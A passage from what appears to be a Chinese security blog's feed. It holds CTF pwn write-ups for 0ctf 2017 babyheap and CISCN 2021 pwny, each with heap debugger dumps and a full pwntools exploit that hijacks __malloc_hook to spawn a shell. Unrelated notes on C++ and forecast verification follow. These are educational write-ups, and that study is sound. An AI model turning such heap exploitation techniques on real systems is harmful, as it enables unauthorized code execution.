class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<h4 id="14-申请回第一个0x60块"><a href="#14-申请回第一个0x60块" class="headerlink" title="14.申请回第一个0x60块"></a>14.申请回第一个0x60块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67aed</span><br><span class="line">0x7f6a86e67aed &lt;_IO_wide_data_0+301&gt;:	0x6a86e66260000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67afd:	0x6a86b28ea0000000	0x6a86b28a7000007f</span><br><span class="line">0x7f6a86e67b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f6a86e67b1d:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b2d &lt;main_arena+13&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b3d &lt;main_arena+29&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b4d &lt;main_arena+45&gt;:	0x6a86e67aed000000	0x000000000000007f</span><br><span class="line">0x7f6a86e67b5d &lt;main_arena+61&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b6d &lt;main_arena+77&gt;:	0x0000000000000000	0x14ee1f61a0000000</span><br><span class="line">0x7f6a86e67b7d &lt;main_arena+93&gt;:	0x14ee1f60f0000056	0x14ee1f60f0000056</span><br><span class="line">0x7f6a86e67b8d &lt;main_arena+109&gt;:	0x14ee1f60f0000056	0x6a86e67b88000056</span><br><span class="line">0x7f6a86e67b9d &lt;main_arena+125&gt;:	0x6a86e67b8800007f	0x6a86e67b9800007f</span><br><span class="line">0x7f6a86e67bad &lt;main_arena+141&gt;:	0x6a86e67b9800007f	0x6a86e67ba800007f</span><br><span class="line">0x7f6a86e67bbd &lt;main_arena+157&gt;:	0x6a86e67ba800007f	0x6a86e67bb800007f</span><br><span class="line">0x7f6a86e67bcd &lt;main_arena+173&gt;:	0x6a86e67bb800007f	0x6a86e67bc800007f</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x00007f6a86b28ea0	0x00007f6a86b28a70</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7f6a86e67b20 - 0x20</span><br><span class="line">0x7f6a86e67b00 &lt;__memalign_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b10 &lt;__malloc_hook&gt;:	0x00007f6a86ae826a	0x0000000000000000</span><br><span class="line">0x7f6a86e67b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b50 &lt;main_arena+48&gt;:	0x6a86b28ea0000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f6a86e67b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005614ee1f61a0</span><br><span class="line">0x7f6a86e67b80 &lt;main_arena+96&gt;:	0x00005614ee1f60f0	0x00005614ee1f60f0</span><br><span class="line">0x7f6a86e67b90 &lt;main_arena+112&gt;:	0x00005614ee1f60f0	0x00007f6a86e67b88</span><br><span class="line">0x7f6a86e67ba0 &lt;main_arena+128&gt;:	0x00007f6a86e67b88	0x00007f6a86e67b98</span><br><span class="line">0x7f6a86e67bb0 &lt;main_arena+144&gt;:	0x00007f6a86e67b98	0x00007f6a86e67ba8</span><br><span class="line">0x7f6a86e67bc0 &lt;main_arena+160&gt;:	0x00007f6a86e67ba8	0x00007f6a86e67bb8</span><br><span class="line">0x7f6a86e67bd0 &lt;main_arena+176&gt;:	0x00007f6a86e67bb8	0x00007f6a86e67bc8</span><br><span class="line">0x7f6a86e67be0 &lt;main_arena+192&gt;:	0x00007f6a86e67bc8	0x00007f6a86e67bd8</span><br></pre></td></tr></table></figure>
<h4 id="15-申请到假的chunk，修改malloc-hook-gt-gadget"><a href="#15-申请到假的chunk，修改malloc-hook-gt-gadget" class="headerlink" title="15.申请到假的chunk，修改malloc_hook-&gt;gadget"></a>15.申请到假的chunk，修改malloc_hook-&gt;gadget</h4><blockquote>
<p>最后只要执行malloc操作，即可get shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",25261)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">	p.sendline(str(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">print(hex(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>常规的堆题流程，，，经典题目</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>fastbin attack</tag>
      </tags>
  </entry>
  <entry>
    <title>2021_ciscn_pwn初赛</title>
    <url>/2021/06/09/15-02/</url>
    <content><![CDATA[<h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>文件下载</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>文件</th>
<th>libc</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="pwny">附件</a></td>
<td><a href="libc-2.27.so">libc</a></td>
</tr>
</tbody>
</table>
</div>
<h3 id="0-检查保护"><a href="#0-检查保护" class="headerlink" title="0.检查保护"></a>0.检查保护</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/ciscn$ file pwny </span><br><span class="line">pwny: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a14a51d7799ec9c936f0c8096c737470a079001b, stripped</span><br><span class="line">winter@ubuntu:~/ciscn$ checksec pwny </span><br><span class="line">[*] '/home/winter/ciscn/pwny'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>64位程序，保护全开。</p>
<h3 id="1-程序流程"><a href="#1-程序流程" class="headerlink" title="1.程序流程"></a>1.程序流程</h3><h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>最开始有一个函数，进行初始化操作setvbuf，并且打开一个文件设备’/dev/urandom’，并且将文件描述符存储在了bss上0x202860的位置。</p>
<p><img src="/2021/06/09/15-02/image-20210609103625666.png" alt="image-20210609103625666"></p>
<h4 id="fun-write函数"><a href="#fun-write函数" class="headerlink" title="fun_write函数"></a>fun_write函数</h4><p><img src="/2021/06/09/15-02/image-20210609103827543.png" alt="image-20210609103827543"></p>
<ol>
<li>请求输入偏移</li>
<li>偏移存储在v0中</li>
<li>从文件描述符0x202860中读取数据，存储到v2中</li>
<li>将v2的值赋值给（0x202060+偏移）的地址</li>
</ol>
<h4 id="fun-read函数"><a href="#fun-read函数" class="headerlink" title="fun_read函数"></a>fun_read函数</h4><p><img src="/2021/06/09/15-02/image-20210609104021390.png" alt="image-20210609104021390"></p>
<p>与fun_write函数类似，只不过最后的赋值变成了，打印（0x202060+偏移）的内容。</p>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>函数fun_read和fun_write，都有函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span>(byte_202860,&amp;v2,<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<p>很显然，需要将byte_202860修改为常用0 =&gt; 控制v2 =&gt; 根据整数溢出，fun_write获得任意地址写，fun_read获得任意地址读。</p>
<h4 id="byte-202860-0"><a href="#byte-202860-0" class="headerlink" title="byte_202860 = 0"></a>byte_202860 = 0</h4><p>看fun_write函数：</p>
<p>首先，<code>byte_202860</code>在<code>qword_202060</code>下面100字节处，所以，只要输入的idx为0x100，那么就可以修改byte_202860的值。</p>
<p>其次，由于v2的值是从/dev/urandom里面读取的，所以第一次修改byte_202860为一个随机值。</p>
<p>但是，如果再来一次，由于上次byte_202860被修改为一个随机值，此时找不到对应的文件描述符，那么，取出来的数都为0，则，v2的值为0，可以再次修改byte_202860的值为0，则成功修改byte_202860为0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span>((<span class="keyword">unsigned</span> __int8)byte_202860, &amp;v2, <span class="number">8u</span>LL);</span><br><span class="line">=&gt;</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;v2, <span class="number">8u</span>LL);</span><br></pre></td></tr></table></figure>
<p>v2的值可以控制，那么就控制了bss上的数据，可以读可以写。</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ul>
<li>修改byte_202860=0</li>
<li>读bss上stderr 的地址，泄露libc</li>
<li>读data上off_202008，泄露程序基地址</li>
<li>修改malloc_hook为one_gadget【需要realloc调整栈帧】</li>
<li>scanf的时候，读入一个很大的数【‘1’*0x400（格式化参数是ld，要数字才能读入）】，会进行一次malloc</li>
<li>getshell</li>
</ul>
<h3 id="3-完整exp"><a href="#3-完整exp" class="headerlink" title="3.完整exp"></a>3.完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./pwny")</span></span><br><span class="line"><span class="comment"># ld_path = "/usr/local/glibc-2.27/lib/ld-2.27.so"</span></span><br><span class="line"><span class="comment"># libc_path = "/usr/local/glibc-2.27/lib/libc-2.27.so"</span></span><br><span class="line">file = <span class="string">"./pwny"</span></span><br><span class="line"><span class="comment"># p = process([ld_path, file],</span></span><br><span class="line"><span class="comment">#             env=&#123;"LD_PRELOAD":libc_path&#125;)</span></span><br><span class="line">libc_path = <span class="string">"./libc-2.27.so"</span></span><br><span class="line">p = process(file,</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:libc_path&#125;)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_read</span><span class="params">(index)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_write</span><span class="params">(index)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">fun_write(<span class="number">0x100</span>)</span><br><span class="line">fun_write(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">fun_read(p64(<span class="number">0xfffffffffffffffc</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">_IO_2_1_stderr_ = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"_IO_2_1_stderr_:"</span>+hex(_IO_2_1_stderr_))</span><br><span class="line">libc_base = _IO_2_1_stderr_ - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">fun_read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Result: "</span>)</span><br><span class="line">data = int(p.recv(<span class="number">12</span>).strip(),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"data:"</span>+hex(data))</span><br><span class="line">pro_base = data <span class="number">-0x202008</span></span><br><span class="line">log.success(<span class="string">"pro_base:"</span>+hex(pro_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget = [0x415e6,0x4163a,0xdfac1]</span></span><br><span class="line">gadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">one_gadget = libc_base + gadget[<span class="number">1</span>]</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+hex(one_gadget))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">offset = (malloc_hook - (pro_base + <span class="number">0x202060</span>)) / <span class="number">8</span></span><br><span class="line"></span><br><span class="line">fun_write(offset)</span><br><span class="line">p.sendline(p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#realloc</span></span><br><span class="line">fun_write(offset<span class="number">-1</span>)</span><br><span class="line">p.sendline(p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(<span class="string">'1'</span>*<span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><blockquote>
<p>注意：</p>
<ol>
<li>本次给的libc是新版的libc</li>
<li>旧版libc没有检查tcache的double free</li>
<li>新版有了</li>
</ol>
<p>2.27堆保护和2.31一样 =&gt; 用2.31做 =&gt; 换2.29的libc</p>
</blockquote>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>C++知识补充</title>
    <url>/2020/10/10/22-34/</url>
    <content><![CDATA[<h2 id="后置返回类型"><a href="#后置返回类型" class="headerlink" title="后置返回类型"></a>后置返回类型</h2><blockquote>
<p>遇到的情况：看着这三行，貌似懂又貌似不懂的样子，问了下，还真的没见过TAT</p>
<p><img src="/2020/10/10/22-34/image-20201010222238876.png" alt="image-20201010222238876"></p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">virtual auto name() const -&gt; std::string = 0;</span><br></pre></td></tr></table></figure>
<ul>
<li>virtual表示虚函数，没关系</li>
<li>-&gt; std::string称为后置返回类型</li>
<li>auto是占位符（C++11新增用法）</li>
</ul>
<p>作用：解决模板中函数返回值类型不确定的问题</p>
<h2 id="read-chk"><a href="#read-chk" class="headerlink" title="__read_chk"></a>__read_chk</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>__read_chk-从文件描述符读取，并进行缓冲区溢出检查</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t __read_chk(int *fd*, void * *buf*, size_t *nbytes*, size_t *buflen*);</span><br></pre></td></tr></table></figure>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>接口<code>__read_chk（）的</code>功能应与接口<code>read（）相同</code>，只是 <code>__read_chk（）</code>在计算结果之前应检查缓冲区溢出。如果预计会发生溢出，则该函数应中止并且调用它的程序应退出。</p>
<p>参数<code>*buflen*</code>指定缓冲区<code>*buf*</code>的大小 。如果<code>*nbytes*</code>超过 <code>*buflen*</code>，该函数将中止，并且调用它的程序将退出。</p>
<p>所述<code>__read_chk（）</code>函数不在源标准; 它仅在二进制标准中。</p>
<p><a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/" target="_blank" rel="noopener">Linux标准基础核心规范4.1</a></p>
]]></content>
      <tags>
        <tag>c++基础</tag>
      </tags>
  </entry>
  <entry>
    <title>7th International Verification Methods Workshop_Tutorial Talks</title>
    <url>/2022/03/08/21-43/</url>
    <content><![CDATA[<h1 id="验证基础"><a href="#验证基础" class="headerlink" title="验证基础"></a>验证基础</h1><h2 id="基础验证概念"><a href="#基础验证概念" class="headerlink" title="基础验证概念"></a>基础验证概念</h2><h3 id="什么是验证？"><a href="#什么是验证？" class="headerlink" title="什么是验证？"></a>什么是验证？</h3><ol>
<li>验证是将<strong>预测</strong>与相关<strong>观测结果</strong>进行<strong>比较</strong>的过程</li>
<li>验证是衡量预测的<strong>质量</strong>（相对其价值）</li>
<li>（验证）对于许多方面，一个更合适的术语是“<strong>评价</strong>”</li>
</ol>
<h3 id="为什么要验证？"><a href="#为什么要验证？" class="headerlink" title="为什么要验证？"></a>为什么要验证？</h3><ol>
<li><strong>监控</strong>模型<strong>性能</strong></li>
<li><strong>识别</strong>模型<strong>缺陷</strong> -&gt; 帮助操作<strong>预测员</strong>了解模型的偏差</li>
<li>改进<strong>决策</strong>、改善<strong>预测</strong> -&gt; 在不同条件下使用对应合适的模型</li>
<li><strong>选择</strong>模型或模型配置（模型是否有所改进？）</li>
<li><strong>纠正</strong>模型<strong>缺陷</strong></li>
<li>确定预测的<strong>劣势、优势、差异</strong> -&gt; 帮助<strong>用户</strong>理解（解释）预测</li>
</ol>
<h3 id="确定验证目标"><a href="#确定验证目标" class="headerlink" title="确定验证目标"></a>确定验证目标</h3><p>思考如下问题：</p>
<ol>
<li>该模型在哪些位置的<strong>性能最好</strong>？</li>
<li>是否可以<strong>调节</strong>使得预测变得<strong>更好/更坏</strong>？</li>
<li><strong>概率</strong>预测是否得到了良好的校准（即是否<strong>可靠</strong>）？</li>
<li>天气预报是否正确地捕捉到了<strong>天气的自然变化</strong>？</li>
</ol>
<p>应该衡量哪些预测性能属性？</p>
<h3 id="预测”好”"><a href="#预测”好”" class="headerlink" title="预测”好”"></a>预测”好”</h3><p>取决于两个方面：</p>
<ol>
<li><p>预测的<strong>质量</strong></p>
</li>
<li><p>用户及其对预测<strong>信息的应用</strong></p>
<p>例子：</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O.png"></p>
<p>许多验证方法结论表示，这种预测没有任何技能，而且非常不准确。</p>
<p>如果我是这个<strong>流域的水务经理</strong>，这是一个相当糟糕的预测。</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O_%E6%B0%B4%E5%9F%9F.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O_%E6%B0%B4%E5%9F%9F.png"></p>
<p>但如果我是一名<strong>航空交通战略规划者</strong>。。这可能是一个很好的预测</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O_%E8%88%AA%E7%A9%BA.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/F_O_%E8%88%AA%E7%A9%BA.png"></p>
<ol>
<li><p>不同的<strong>用户</strong>对预测的好坏有不同的看法</p>
</li>
<li><p>不同的<strong>验证方法</strong>可以衡量<strong>不同类型的“好”</strong></p>
</li>
</ol>
</li>
<li><p>预测质量只是预测<strong>“好坏”的一个方面</strong></p>
</li>
<li><p>预测值与预测质量相关（但预测质量提高，某些方面的预测值可能下降）</p>
</li>
</ol>
<h3 id="开展验证研究的基本指南"><a href="#开展验证研究的基本指南" class="headerlink" title="开展验证研究的基本指南"></a>开展验证研究的基本指南</h3><ol>
<li>考虑<strong>用户</strong>（谁对验证结果感兴趣）</li>
<li>用户最关心的是预测质量的哪些<strong>方面</strong>？</li>
<li>确定代表正在被预测的事件的<strong>观测结果</strong></li>
<li>确定可以提供感兴趣的问题的答案的<strong>多个验证属性</strong></li>
<li>选择适当度量和表示感兴趣的属性的<strong>度量</strong>和<strong>图形</strong></li>
<li>确定一个提供技能参考水平的<strong>比较标准</strong>（例如：持久性、气候学、旧模型）</li>
</ol>
